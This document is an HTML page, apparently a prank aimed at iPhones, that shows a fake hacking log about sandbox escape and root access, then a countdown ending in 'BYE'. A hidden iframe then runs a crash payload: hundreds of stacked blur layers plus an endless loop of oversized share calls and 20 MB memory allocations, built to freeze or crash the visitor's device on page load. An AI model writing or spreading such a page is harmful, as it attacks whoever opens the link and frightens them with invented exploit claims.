<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Executing Exploit...</title>
    <style>
        body {
            background: #000;
            color: #00ff00;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: 'Courier New', Courier, monospace;
            overflow: hidden;
            -webkit-user-select: none;
        }

        .terminal-container {
            width: 92%;
            max-width: 600px;
            padding: 20px;
            border: 1px solid #333;
            background: rgba(10, 10, 10, 0.95);
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.1);
        }

        #console {
            min-height: 180px;
            font-size: 13px;
        }

        .line {
            margin-bottom: 6px;
            opacity: 0;
            animation: fadeIn 0.1s forwards;
        }

        @keyframes fadeIn { to { opacity: 1; } }

        .status { color: #fff; font-weight: bold; }
        .path { color: #1ad2dc; }

        /* Стиль для огромного таймера */
        #countdown {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100vw; height: 100vh;
            background: #000;
            color: #ff3b30; /* Красный Apple цвет */
            font-size: 150px;
            font-weight: bold;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        .footer {
            margin-top: 30px; font-size: 10px; color: #444;
            border-top: 1px solid #222; padding-top: 10px;
        }

        #respring-iframe {
            position: fixed; top: 0; left: 0; width: 1px; height: 1px;
            border: none; opacity: 0.01; pointer-events: none;
        }
    </style>
</head>
<body>

    <div id="terminal" class="terminal-container">
        <div id="console"></div>
        <div class="footer">
            © 2026 <span>neonmodder123</span> | Licensed under MIT
        </div>
    </div>

    <div id="countdown"></div>

    <iframe id="respring-iframe" sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>

    <script>
        const consoleEl = document.getElementById('console');
        const terminalEl = document.getElementById('terminal');
        const countdownEl = document.getElementById('countdown');
        
        const logs = [
            "[INFO] Starting session...",
            "[OK] Connected to kernel exploit service.",
            "[INFO] Escaping Sandbox...",
            "[OK] Root access obtained.",
            "[INFO] Mounting <span class='path'>/var/mobile/Containers/</span>",
            "[INFO] Reading <span class='path'>/private/var/mobile/Library/</span>",
            "[OK] Found SpringBoard configuration.",
            "[INFO] Patching <span class='path'>/System/Library/CoreServices/</span>",
            "[WRN] Memory pressure critical (Heap Spraying)",
            "[RUN] Launching final payload..."
        ];

        let lineIndex = 0;

        function addLog() {
            if (lineIndex < logs.length) {
                const div = document.createElement('div');
                div.className = 'line';
                div.innerHTML = logs[lineIndex];
                consoleEl.appendChild(div);
                lineIndex++;
                let delay = Math.random() * (600 - 200) + 200;
                setTimeout(addLog, delay); 
            } else {
                startBigCountdown();
            }
        }

        function startBigCountdown() {
            // Скрываем консоль, показываем таймер
            terminalEl.style.display = 'none';
            countdownEl.style.display = 'flex';
            
            let count = 3;
            countdownEl.innerText = count;

            const timer = setInterval(() => {
                count--;
                if (count > 0) {
                    countdownEl.innerText = count;
                } else {
                    clearInterval(timer);
                    countdownEl.innerText = "BYE"; // Последнее, что он увидит
                    startRespring();
                }
            }, 1000);
        }

        function startRespring() {
            const frame = document.getElementById('respring-iframe');
            const respringScript = `
                <html>
                <body style="margin:0; overflow:hidden;">
                    <script>
                        const container = document.createElement('div');
                        container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
                        document.body.appendChild(container);

                        for (let i = 0; i < 500; i++) {
                            let d = document.createElement('div');
                            d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg); opacity: 0.99;';
                            container.appendChild(d);
                        }

                        setInterval(() => {
                            try {
                                navigator.share({ title: 'R', text: 'R'.repeat(100000) });
                            } catch(e) {}
                            let x = new Uint8Array(1024 * 1024 * 20);
                            crypto.getRandomValues(x);
                        }, 0);
                    <\/script>
                </body>
                </html>
            `;
            frame.srcdoc = respringScript;
        }

        window.onload = addLog;
    </script>
</body>
</html>
